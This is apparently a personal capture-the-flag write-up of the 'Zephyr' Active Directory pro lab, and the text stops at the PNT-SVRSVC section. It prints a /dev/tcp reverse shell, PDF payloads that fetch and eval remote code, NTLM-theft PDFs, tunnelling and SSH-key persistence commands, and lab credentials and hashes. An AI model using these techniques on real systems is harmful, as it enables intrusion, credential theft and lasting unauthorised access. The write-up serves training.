---
layout: post
title: "zephyr"
date: 2025-12-02 
categories: Pro Lab
---
# zephyr


# Persistence

```bash
#start proxy server
./proxy -laddr 0.0.0.0:80 -selfcert

#get on mail pivot
ssh matt@10.10.110.35   #L1f30f4Spr1ngCh1ck3n!

sudo su -

cd /root/.ssh

echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF3pIyrb1ceofuxvUQHdCy0meE8zzwnrk6GlNKzNMrMJ kali@kali' >> authorized_keys

ssh -i zephyr.key root@10.10.110.35

scp -i zephyr.key agent root@10.10.110.35:/tmp/

./agent -connect 10.10.16.5:80 -ignore-cert

#back on proxy session
session
start

#create tun interface
sudo ip tuntap add user kali mode tun ligolo

sudo ip link set ligolo up

sudo ip route add 192.168.110.0/24 dev ligolo

#connect to 2nd internal subnet through DC.painters.htb
evil-winrm -u Administrator -H 5bdd6a33efe43f0dc7e3b2435579aa53 -i 192.168.110.55

cd C:\programdata

upload agent.exe

.\agent.exe -connect 10.10.16.5:80 -ignore-cert

#back on localhost
sudo ip tuntap add user kali mode tun ligolo-d
sudo ip link set ligolo-d up
sudo ip route add 192.168.210.0/24 dev ligolo-d 

#back on proxy session
session
start --tun ligolo-d

#connect to 192.168.210.0/24 through proxychains with chisel on DC
upload chisel.exe

#start chisel server on localhost
#./chisel server -p 445 -reverse -v
#The port above is too important, let's just forward a listener from mail server:
#on proxy session
listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:1234

#on localhost
./chisel server -p 1234 -reverse -v

#connect from DC
./chisel.exe client 192.168.110.51:1234 R:81:192.168.210.13:443 

https://localhost:81

#on localhost
python cve-2022-23131.py https://localhost:81

#now the session cookie and sign on
/usr/bin/bash -c '/usr/bin/bash -i >& /dev/tcp/10.10.16.5/443 0>&1'
#now go https://localhost:81, follow steps to get shell on zabbix server; once shell
./agent -connect 10.10.16.5:80 -ignore-cert

#on proxy session
session
start --tun ligolo-d

#Try changing the pivot from  MGMT1
#we need chisel reverse proxy, on Zabbix server to reach .210 network.
TF=$(mktemp)
echo 'os.execute("/usr/bin/sh")' > $TF
sudo nmap --script=$TF

python3 -c 'import pty; pty.spawn("/bin/bash")'

#firewall block ports, we can use 445
#on proxy
listener_add --addr 0.0.0.0:445 --to 0.0.0.0:1234

./chisel client -v 192.168.110.51:445 R:socks

#now connect from mgmt1
proxychains evil-winrm -u Administrator -H 545c503123664e5713439e088bd91035 -i 192.168.210.11

upload agent.exe

.\agent.exe -connect 10.10.16.5:80 -ignore-cert

#now start session on proxy
session
start --tun ligolo-d
```

# Description

### Zephyr!

Zephyr is an immersive Windows Active Directory environment, designed to be attacked as a means of learning and honing your engagement skills.  Beating the lab will require a number of skills, including:

- OSINT & phishing
- Local privilege escalation
- Persistence techniques
- Active Directory enumeration & exploitation
- A variety of lateral movement techniques
- Exploit development
- Creative thinking
- Patience & perseverance!

The goal of the lab is to reach Domain Admin and collect all the flags.

Are you 1337 enough?

# Summary

## Mail

- Web allows users to upload pdf file; we know this is a AD exploitation lab
- upload bad-pdf to capture NTLM hash of riley
- hashcat with rockyou.txt to crack NTLM
- ssh onto Mail server
- we are on the internal domain, with access to AD environment
- ligolo-ng to setup tunnel to access internal IP 192.168.110.0/24
- use rusthound and riley's credentials to map out AD with bloodhound; continue exploitation at DC

## DC.painters.htb

- kerberoasting with nxc to find web_svc
- hashcat to crack web_svc password
- web_svc can logon to PNT-SVRSVC; continue exploitation at PNT-SVRSVC

## PNT-SVRSVC

- evil-winrm onto host; web_svc is an Administrator on host
- dump SAM, SYSTEM, SECURITY
- secretsdump to reveal NTLM hashes for users, including James
- password spray within painters.htb domain to find James' access to PNT-SVRBPA; exploitation continues there

## PNT-SVRBPA

- evil-winrm as James onto host
- James is local administrator on host
- dump sam + lsa with nxc; reveals blake's NTLM
- bloodhound reveal blake has AllowedToDelegate right over DC.painters.htb
- impersonate DC on cifs/dc.painters.htb SPN; use impacket-getST to get Kerberos ticket to then DCSync the DC; obtained domain admin's NTLM hash and matt's cleartext password

## Mail

- matt is in the sudoers group
- sudo su to switch to root account; we are root

## PNT-SVRPSB

- we have become domain admin in painters.htb, we can evil-winrm on as domain admin.

## DC.painters.htb

- evil-winrm as administrator
- enumerating files; zabbix_agentd.conf reveal communication with an internal host 192.168.210.13
- ping sweep reveal more hosts
- use nxc LDAP module get-network as domain admin to reveal all saved subdomains; reveal one extra host WORKSTATION-1

## WORKSTATION-1

- evil-winrm on as domain admin

## Zabbix Server

- Zabbix agent executable reveal Zabbix version on DC.painters.htb
- zabbix_agentd.log reveal IP of Zabbix server
- research version 5.4.12 exploit; generate admin cookie and SSO bypass to sign in as administrator
- Zabbix allows admin to create script, where the server can execute; simple bash reverse shell to get backend access on Zabbix server
- we have sudo privilege on nmap; GTFOBin to follow steps and raise privilege to root
- set up second ligolo-ng tunnel to reach internal subnet 192.168.210.0/24
- ping sweep reveal hosts
- zabbix_server.conf reveal Zabbix user's password
- login to MySQL as Zabbix; reveal user hashes; cracked marcus' passwored with hashcat

## SVRDC01.zsm.local

- marcus is a valid domain user
- rusthound to map out AD
- marcus has AddKeyCredentialLink right over SVRMGMT1; we can create shadow credentials and get SVRMGMT1’s NTLM hash
- use certipy-ad shadow auto method to get SVRMGMT1$ NT hash
- SVRMGMT1$ is part of General Management Group -> hash forceChangePassword on user Jamie -> Jamie can add himself to CA Managers; bloodyAD to carry out changes
- certipy-ad did not find any vulnerable templates
- from enumerating hostnames with nxc, we know 192.168.210.12 is CA server; let's test our rights there

## ZPH-SVRCA01

- evil-winrm as Jamie
- flag in C:\Users\Public; not much else here

## ZPH-SVRMGMT1

- evil-winrm onto machine as Jamie
- Jamie is local administrator on the machine
- dump SAM + LSA via nxc
- evil-winrm as marcus; upload SharpChrome; extracted melissa's password from DPAPI
- nxc password spray to reveal MSSQL access on SQL02

## SQL01

- reuse Zabbix credential to access mssql on SQL01; impacket-mssqlclient to access
- enumeration of database shows all hosts in internal subnet
- enum_impersonate reveal Zabbix can impersonate sa
- exec_as_login to switch user as sa; enable_xp_cmdshell to enable command execution
- execute simple nishange reverse shell to get access to SQL01; we are nt service\mssqlserver and have SeImpersonatePrivilege; vulnerable to potato exploits
- exploit GodPotato to get SYSTEM shell
- downloaded SAM, SYSYTEM, SECURITY on localhost; dumped password hashes with secretsdump
- back on mssql; enum_links to find linked database on SQL02; use_link to connect as sa
- enable_xp_cmdshell to execute nishang reverse shell to get access on SQL02

## SQL02

- we have SeImpersonatePrivilege; exploit with GodPotato to get SYSTEM shell
- dump SAM, SECURITY, SYSTEM with secretsdump to reveal password hashes and mssql_svc's domain password
- ipconfig /all to find the DNS server 192.168.210.16; assume this is the DC
- nmap scan confirmed it is the third DC ZPH-SVRCDC01.internal.zsm.local

## ZPH-SVRCDC01.internal.zsm.local

- rusthound to map out AD with mssql_svc's credentials
- enumerate all users with nxc; reveal melissa
- bloodhound reveal melissa is part of Backup Operators; can dump SAM, SYSTEM, SECURITY
- nxc smb module backup_operator to dump registries, reveal admin + ZPH-SVRCDC01 machine account's NT hash
- administrator's hash does not work, but machine NT hash works
- DCSync with SVRCDC01$; use impacket-secretsdump for remote dumping
- we have domain admin hash
- evil-winrm as administrator onto host
- enumerate trust with ActiveDirectory module; bi-directional trust with parent domain zsm.local
- perform extraSid attack; craft golden ticket with krbtgbt's aesKey; impersonate SVRDC01.zsm.local administrator with impacket-ticketer
- dump ntds.dit with nxc smb module ntdsutil; success; we are domain admin on all domains

## ZPH-SVRADFS1

- we are domain admin; access via evil-winrm

## ZPH-SVRCHR.INTERNAL.ZSM.LOCAL

- aron is part of Service Management group, reuses mssql_svc's password
- we have winrm access to the machine
- PrivescCheck.ps1 to enumerate vulnerable services with Invoke-PrivescCheck
- wuauserv service runs as SYSTEM; as part of Service Management group, we have all access on the service
- AV will block/delete .exe/malware file; use nim-reverse-shell to bypass AV
- sc.exe to change binPath of service to execute our reverse shell
- sc.exe to start service; we have SYSTEM shell
- we know from earlier enumeration there is a SUP machine at 192.168.210.18 that no hosts can interact with
- Test-NetConnection on port 5985 to see our current host can interact with it; success
- setup chisel tunnel to allow dynamic SOCKS proxy from HR host
- bloodhound reveals melissa is part of Support group

## ZPH-SVRCSUP.INTERNAL.ZSM.LOCAL

- proxychains evil-winrm onto the machine as melissa
- we are local administrators
- alternative path; since we are backup operators; mount DC drive with net use then create shadow copy of NTDS.dit locally

# Attack Path

Let’s enumerate for machines in the subnet:

```bash
sudo nmap -sC -sV -oN nmap/zephyr_starting_point 10.10.110.0/24

Nmap scan report for 10.10.110.2
Host is up (0.020s latency).
All 1000 scanned ports on 10.10.110.2 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 10.10.110.35
Host is up (0.020s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 91:ca:e7:7e:99:03:a9:78:e8:86:2e:e8:cc:2b:9f:08 (RSA)
|   256 b1:7f:c0:06:9b:e7:08:b4:6a:ab:bd:c2:96:04:23:49 (ECDSA)
|_  256 0d:3b:89:bc:d5:a4:35:e0:dd:c4:22:14:7a:48:ad:7c (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://painters.htb/home
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| tls-alpn:
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-title: Did not follow redirect to https://painters.htb/home
| ssl-cert: Subject: commonName=painters.htb/countryName=GB
| Subject Alternative Name: DNS:mail.painters.htb, IP Address:192.168.110.51
| Not valid before: 2022-04-04T10:00:52
|_Not valid after:  2032-04-01T10:00:52
| tls-nextprotoneg:
|   h2
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

We found two potential hosts. Let’s do a full port scan on 10.10.110.2 first before moving on:

```bash
sudo nmap 10.10.110.2 --min-rate=10000 -v -p-

Not shown: 65535 filtered tcp ports (no-response)
```

Let’s scan for UDP:

```bash
sudo nmap -sU -p 161,162 10.10.110.2 

PORT    STATE         SERVICE
161/udp open|filtered snmp
162/udp open|filtered snmptrap

```

Nothing. Let’s shift all our focus on 10.10.110.35 now. Let’s do a full port scan:

```bash
sudo nmap -v -p- --min-rate=10000 10.10.110.35

PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

```

Same outcome. 

Let’s also add the domain name and mail server name to our /etc/hosts file:

```bash
10.10.110.35 painters.htb mail.painters.htb
```

Let’s investigate web.

## 10.10.110.35 Web pwned

The web server is nginx 1.18.0, the backend is Ubuntu.

Upon visiting the web page, we get automatically redirected to HTTPS:

![image.png]({{ site.baseurl }}/assets/zephyr/image.png)

Contact page:

![image.png]({{ site.baseurl }}/assets/zephyr/image%201.png)

![image.png]({{ site.baseurl }}/assets/zephyr/image%202.png)

A POST request is sent, but we don’t know where.

Let’s test for XSS

```bash
"><script src=http://10.10.16.5/name></script>
"><script src=http://10.10.16.5/subject></script>
"><script src=http://10.10.16.5/message></script>
```

No response. 

Let’s try xsstrike:

```bash
python xsstrike.py -u "https://painters.htb/listing?id=2"

[~] Checking for DOM vulnerabilities 
[+] WAF Status: Offline 
[!] Testing parameter: id 
[-] No reflection found 
```

Let’s try the contact form:

```bash
python xsstrike.py -u "https://painters.htb/contact" --json --data '{"name":"bobath","email":"bobath@gmial.com","subject":"sometsubject","message":"safjkalsdjfl"}'

[~] Checking for DOM vulnerabilities 
[-] WAF detected: Anquanbao Web Application Firewall (Anquanbao) 
[!] Testing parameter: name 
[-] No reflection found 
[!] Testing parameter: email 
[-] No reflection found 
[!] Testing parameter: subject 
[-] No reflection found 
[!] Testing parameter: message 
[-] No reflection found
```

There is a Vacancies tab:

```bash
https://painters.htb/listing?id=3
```

![image.png]({{ site.baseurl }}/assets/zephyr/image%203.png)

The HTTP parameter id is user controlled, a possible IDOR. 

A non-existing id:

![image.png]({{ site.baseurl }}/assets/zephyr/image%204.png)

Trying to get /etc/passwd:

```bash
https://painters.htb/listing?id=/etc/passwd

https://painters.htb/listing?id=../../../../../../etc/passwd

https://painters.htb/listing?id=....//....//....//....//....//....//etc/passwd

```

![image.png]({{ site.baseurl }}/assets/zephyr/image%205.png)

Let’s test for SQLi:

```bash
sqlmap 'https://painters.htb/listing?id=1' --batch
```

No SQLi.

Let’s attempt to upload a file. The web prompts us to upload pdf files. We get denied when we attempted to upload a png.

![image.png]({{ site.baseurl }}/assets/zephyr/image%206.png)

We send it to repeater, and fuzz the name to test.pdf:

![image.png]({{ site.baseurl }}/assets/zephyr/image%207.png)

This time we get a response 1. 

However we don’t know where the file uploaded to. 

![image.png]({{ site.baseurl }}/assets/zephyr/image%208.png)

This might suggest that the file are opened by staff. We are probably looking at a XSS vulnerability. 

Searching pdf file upload xss, we come across https://medium.com/@osamaavvan/stored-xss-in-pdf-viewer-9cc5b955de2b which talks about CVE-2024–4367. This is a vulnerability where opening the pdf executes JavsScript code. Also this video helps: https://www.youtube.com/watch?v=LFp0aQoGWkE

Now let’s download the poc from: [https://raw.githubusercontent.com/LOURC0D3/CVE-2024-4367-PoC/main/CVE-2024-4367.py](https://raw.githubusercontent.com/LOURC0D3/CVE-2024-4367-PoC/main/CVE-2024-4367.py) and create a simple payload to test if it works:

```bash
python xss_pdf.py "alert(top.document.domain)"

[+] Created malicious PDF file: poc.pdf
[+] Open the file with the vulnerable application to trigger the exploit.
```

Now let’s start a listener:

```bash
nc -lnvp 80
```

Now let’s upload our pdf file:

![image.png]({{ site.baseurl }}/assets/zephyr/image%209.png)

```bash
python xss_pdf.py "fetch('http://10.10.16.5/data').then(res=>res.text().then(code=>eval(code)))"

python xss_pdf.py "fetch('http://10.10.16.5:445/data')"

python xss_pdf.py 'src="http://10.10.16.5:445/data"'

python xss_pdf.py "document.location='http://10.10.16.5:80'"

python xss_pdf.py "app.launchURL('file:////10.10.16.5/pl4')"

python test.py "10.10.16.5"

(app.launchURL\('file:////10.10.16.5/pl4', true\);) 

```

### Bad-PDF Foothold at mail

Since this is an AD box, searching the keyword malicious pdf steal ntlm, we find:

![image.png]({{ site.baseurl }}/assets/zephyr/image%2010.png)

[https://github.com/deepzec/Bad-Pdf](https://github.com/deepzec/Bad-Pdf)

This is the research blog: https://research.checkpoint.com/2018/ntlm-credentials-theft-via-pdf-files/

Let’s download the python script and generate a badpdf.

```bash
sudo python badpdf.py

Responder detected: /usr/sbin/responder                                
Please enter Bad-PDF host IP:                                          
10.10.16.5                                                             
Please enter output file name:                                         
bad.pdf                                                                    
Please enter the interface name to listen(Default eth0):               
tun0                               
[*] Starting Process.. [*]         
Bad PDF bad.pdf created 
```

Now let’s upload the file.

![image.png]({{ site.baseurl }}/assets/zephyr/image%2011.png)

Now we wait.

It does not work. Viewing the pdf in nano, we see GoToE is the default method, let’s also try GoToR.

![image.png]({{ site.baseurl }}/assets/zephyr/image%2012.png)

![image.png]({{ site.baseurl }}/assets/zephyr/image%2013.png)

```bash
[SMB] NTLMv2-SSP Client   : 10.10.110.35
[SMB] NTLMv2-SSP Username : PAINTERS\riley
[SMB] NTLMv2-SSP Hash     : riley::PAINTERS:67a5a09c3b8bb133:D1C18971DC4A7F3A599B6CF70C09AAF3:010100000000000000D3664C5654DC017751882D22A3F40D00000000020008004F0043003400570001001E00570049004E002D004E00490059005000480030005200530032004C00470004003400570049004E002D004E00490059005000480030005200530032004C0047002E004F004300340057002E004C004F00430041004C00030014004F004300340057002E004C004F00430041004C00050014004F004300340057002E004C004F00430041004C000700080000D3664C5654DC0106000400020000000800300030000000000000000000000000200000D031964CA6DF654B1D046DB529636CA66820F153F7EB40565014E46EB42C2F9E0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0035000000000000000000
```

Finally we got the hash. Now let’s crack it with hashcat:

```bash
.\hashcat.exe -m 5600 ..\hashes.txt ..\rockyou.txt

riley:P@ssw0rd
```

Let’s run fuzzing in the background. Fuzz for subdomains:

```bash
ffuf -u https://10.10.110.35 -H "Host: FUZZ.painters.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 0
```

None.

Fuzz for subdir:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u https://painters.htb/FUZZ -ic

home                    [Status: 200, Size: 23234, Words: 7634, Lines: 409, Duration: 23ms]
contact                 [Status: 200, Size: 15557, Words: 4798, Lines: 283, Duration: 29ms]
newsletter              [Status: 405, Size: 0, Words: 1, Lines: 1, Duration: 19ms]
static                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 21ms]
testimonials            [Status: 200, Size: 13235, Words: 3901, Lines: 242, Duration: 23ms]
applications            [Status: 405, Size: 0, Words: 1, Lines: 1, Duration: 19ms]
contact-us              [Status: 405, Size: 0, Words: 1, Lines: 1, Duration: 21ms]
quote                   [Status: 405, Size: 0, Words: 1, Lines: 1, Duration: 19ms]
administration          [Status: 200, Size: 3039, Words: 351, Lines: 60, Duration: 32ms]
views                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 22ms]
vacancies               [Status: 200, Size: 15428, Words: 4788, Lines: 283, Duration: 22ms]
listing                 [Status: 200, Size: 11515, Words: 3284, Lines: 221, Duration: 33ms]
models                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 21ms]
                        [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 27ms]
controllers             [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 24ms]
```

Use feroxbuster:

```bash
feroxbuster -u https://painters.htb -k -C 404
```

Login page:

```bash
https://painters.htb/administration
```

![image.png]({{ site.baseurl }}/assets/zephyr/image%2014.png)

Default login admin:admin did not work. No SQLi.

Let’s try riley.

Did not work. 

```bash
riley:P@ssw0rd
Riley:P@ssw0rd
admin:P@ssw0rd
```

Let’s try ssh:

```bash
ssh riley@painters.htb
```

![image.png]({{ site.baseurl }}/assets/zephyr/image%2015.png)

We are logged in.

After obtaining a few service passwords, let’s try:

```bash
P@ssw0rd
!QAZ1qaz
L1f30f4Spr1ngCh1ck3n!
!QAZ2wsx
WinterIsHere2022!
```

Let’s try again with hashcat:

```bash
hashcat -m 3200 hashes.txt pwds.txt
```

No result.

## 192.158.110.51 mail Enumeration

Enumerating privileges:

![image.png]({{ site.baseurl }}/assets/zephyr/image%2016.png)

Checking our ip address:

```bash
ifconfig

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.110.51  netmask 255.255.255.0  broadcast 192.168.110.255
        inet6 fe80::250:56ff:fe94:c993  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:94:c9:93  txqueuelen 1000  (Ethernet)
        RX packets 90142  bytes 44389325 (44.3 MB)
        RX errors 0  dropped 63  overruns 0  frame 0
        TX packets 102035  bytes 39608016 (39.6 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

Let’s upload linpeas to enumerate the box fully:

```bash
#set up python server on host
python3 -m http.server 80

#on target
wget http://10.10.16.5/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

```

Interesting outputs:

```bash
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits
Linux version 5.4.0-200-generic (buildd@lcy02-amd64-023) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #220-Ubuntu SMP Fri Sep 27 13:19:1
6 UTC 2024
Distributor ID: Ubuntu
Description:    Ubuntu 20.04.6 LTS
Release:        20.04
Codename:       focal

╔══════════╣ Sudo version
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version
Sudo version 1.8.31

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester

Vulnerable to CVE-2021-3560

╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
══╣ Active Ports (netstat)
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:587             0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:110             0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:143             0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:993             0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:995             0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::587                  :::*                    LISTEN      -                   
tcp6       0      0 :::110                  :::*                    LISTEN      -                   
tcp6       0      0 :::143                  :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::25                   :::*                    LISTEN      -                   
tcp6       0      0 :::443                  :::*                    LISTEN      -                   
tcp6       0      0 :::993                  :::*                    LISTEN      -                   
tcp6       0      0 :::995                  :::*                    LISTEN      - 

╔══════════╣ Users with console
blake:x:1002:1002:Blake Morris,,,:/home/blake:/bin/bash
daniel:x:1001:1001:Daniel Morris,,,:/home/daniel:/bin/bash
matt:x:1000:1000:Matt Fisher:/home/matt:/bin/bash
riley:x:1003:1003:Riley Smart,,,:/home/riley:/bin/bash
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1000(matt) gid=1000(matt) groups=1000(matt),27(sudo)
uid=1001(daniel) gid=1001(daniel) groups=1001(daniel)
uid=1002(blake) gid=1002(blake) groups=1002(blake)
uid=1003(riley) gid=1003(riley) groups=1003(riley)

╔══════════╣ Unexpected in /opt (usually empty)
total 12
drwxr-xr-x  2 root root 4096 Apr  4  2022 .
drwxr-xr-x 18 root root 4096 Dec  9  2024 ..
-rw-r--r--  1 root root  272 Apr  4  2022 config

```

Let’s interact with IMAP:

```bash
openssl s_client -connect localhost:imaps

A1 LOGIN riley P@ssw0rd

A1 LIST "" *

result:
* LIST (\HasNoChildren) "." INBOX

A1 SELECT INBOX
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 0 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1763029118] UIDs valid
* OK [UIDNEXT 1] Predicted next UID
A1 OK [READ-WRITE] Select completed (0.005 + 0.000 + 0.004 secs).
A1 FETCH 1 BODY[]
A1 BAD Error in IMAP command FETCH: Invalid messageset (0.001 + 0.000 secs).

#daniel also nothing

L1f30f4Spr1ngCh1ck3n!

A1 LOGIN matt L1f30f4Spr1ngCh1ck3n!

A1 LIST "" *

A1 SELECT INBOX

A1 OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE] Logged in
A1 LIST "" *
* LIST (\HasNoChildren) "." INBOX
A1 OK List completed (0.001 + 0.000 secs).
A1 SELECT INBOX
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 0 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1764550418] UIDs valid
* OK [UIDNEXT 1] Predicted next UID
A1 OK [READ-WRITE] Select completed (0.006 + 0.000 + 0.005 secs).

* BAD Error in IMAP command : Unknown command (0.001 + 0.000 secs).

```

There are no mail. 

Not a lot to enumerate. Let’s try CVE-2021-3560. 

https://www.exploit-db.com/exploits/50011

Let’s upload the exploit and see if it works. 

```bash
dos2unix exploit.sh

wget http://10.10.16.9:8002/exploit.sh

chmod +x exploit.sh

./exploit.sh

[*] Vulnerable version of polkit found
[*] Determining dbus-send timing
[*] Attempting to create account

```

Did not work. Let’s try this other one:

[https://github.com/swapravo/polkadots/blob/main/polkadots](https://github.com/swapravo/polkadots/blob/main/polkadots)

Let’s try this other exploit.

```bash
./polkadots

#enter iaminvincible!
```

Does not work either. Let’s move on first. We set up ligolo-ng tunnel:

```bash
wget http://10.10.16.5/agent

chmod +x agent
```

Set up our proxy server:

```bash
./proxy -selfcert

#setup tun
sudo ip tuntap add user kali mode tun ligolo

sudo ip link set ligolo up

#on target
./agent -connect 10.10.16.5:11601 -ignore-cert
```

It’s not connecting. There seem to be a firewall rule. Let’s set up our proxy on port 80

```bash
./proxy -laddr 0.0.0.0:80 -selfcert 

#on target
./agent -connect 10.10.16.5:80 -ignore-cert

#back on proxy
session
start

#on host terminal
sudo ip route add 192.168.110.0/24 dev ligolo
```

Now let’s test if the tunnel works:

```bash
ping -c 1 192.168.110.51

PING 192.168.110.51 (192.168.110.51) 56(84) bytes of data.
64 bytes from 192.168.110.51: icmp_seq=1 ttl=64 time=43.2 ms

--- 192.168.110.51 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 43.238/43.238/43.238/0.000 ms
```

Let’s perform a ping sweep to find available hosts:

```bash
#on target mail
for i in $(seq 254); do ping 192.168.110.$i -c1 -W1 & done | grep from

64 bytes from 192.168.110.1: icmp_seq=1 ttl=64 time=0.835 ms
64 bytes from 192.168.110.51: icmp_seq=1 ttl=64 time=0.018 ms
64 bytes from 192.168.110.54: icmp_seq=1 ttl=128 time=3.26 ms
64 bytes from 192.168.110.52: icmp_seq=1 ttl=128 time=1.85 ms
64 bytes from 192.168.110.53: icmp_seq=1 ttl=128 time=1.20 ms
64 bytes from 192.168.110.55: icmp_seq=1 ttl=128 time=0.825 ms
```

Let’s print route:

```bash
route -n

Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         192.168.110.1   0.0.0.0         UG    0      0        0 eth0
192.168.110.0   0.0.0.0         255.255.255.0   U     0      0        0 eth0

```

The gateway is 192.168.110.1, we are on 192.168.110.51.

This leaves four hosts:

```bash
192.168.110.52
192.168.110.53
192.168.110.54
192.168.110.55
```

Let’s save that to a file and perform nmap scan on them.

```bash
sudo nmap -sC -sV -iL hosts -oN nmap/valid_host 
```

### Privilege Escalation mail

Received password from DCSync DC. 

```bash
su matt
```

![image.png]({{ site.baseurl }}/assets/zephyr/image%2017.png)

Success. 

We are in the sudo group, so let’s just get root:

```bash
sudo su -
```

![image.png]({{ site.baseurl }}/assets/zephyr/image%2018.png)

We are now root.

Looking in /scripts dir, we find:

```bash
painter.sql:

<SNIP>

INSERT INTO `users` VALUES (1,'admin','$2y$10$7BLIFYjCq4PF0U3ZH86b1eQLfO9EEIO.GRQMKM5XX02FAbBFd95j2','2022-03-19 16:42:50');               

restore.sh:
#!/bin/bash

mysql painter -e "update users set password='\$2y\$10\$7BLIFYjCq4PF0U3ZH86b1eQLfO9EEIO.GRQMKM5XX02FAbBFd95j2' where username='admin';"
    
```

Same password. Let’s try cracking it:

```bash
.\hashcat.exe -m 3200 ..\hashes.txt ..\rockyou.txt
```

Does not crack. 

We can also check the /etc/shadow file, attempt to crack them:

```bash
matt:$6$yPMubWhgYXpKemZc$9tnx1LBoa01jTnszEfOrh/9Ec1NIBSXUQOum/xFTfgd3B3TYtNTD.E2iqdkO4RIvHWKmuwvlEKQhfujnFQvTL0:19058:0:99999:7:::
daniel:$6$ebdTZoFnR8Lh7CDz$jFWOxqRFocmlMX8QgbV4oidAowBJf2Bv9BGpZ5jJAgsfF6oJxv7gXo5PhG.6KRUo2bO10oxuWdzOBL1crJQka.:19058:0:99999:7:::
blake:$6$Ui5oWrdWRO/23Q7w$obBhEGJBtM9RQ2DCoHjbYAXY5Fw.1iGfWDYtAeiKmq.0n8JEAFnzL2bWGeV.FJsG87RcSBZgSAuU7NxmupZtv0:19058:0:99999:7:::
riley:$6$CwzTaMUoz0hoQmlm$p9xUV.EZtZ.gK9JqxRJsqc8JmmuU3z9I6BX9gOszzS4imdrOFINgh12oOpeYWDZy8NwjZOt8FIvm6ogUVZZT01:19058:0:99999:7:::
```

We already have riley, matt. Let’s try and crack blake and daniel. This looks like 512. 

```bash
$6$ebdTZoFnR8Lh7CDz$jFWOxqRFocmlMX8QgbV4oidAowBJf2Bv9BGpZ5jJAgsfF6oJxv7gXo5PhG.6KRUo2bO10oxuWdzOBL1crJQka.
$6$Ui5oWrdWRO/23Q7w$obBhEGJBtM9RQ2DCoHjbYAXY5Fw.1iGfWDYtAeiKmq.0n8JEAFnzL2bWGeV.FJsG87RcSBZgSAuU7NxmupZtv0
```

Let’s crack with hashcat:

```bash
.\hashcat.exe -m 1800 ..\hashes.txt ..\rockyou.txt

daniel:P@ssw0rd
```

## 192.168.110.52 PNT-SVRSVC

```bash
Nmap scan report for 192.168.110.52
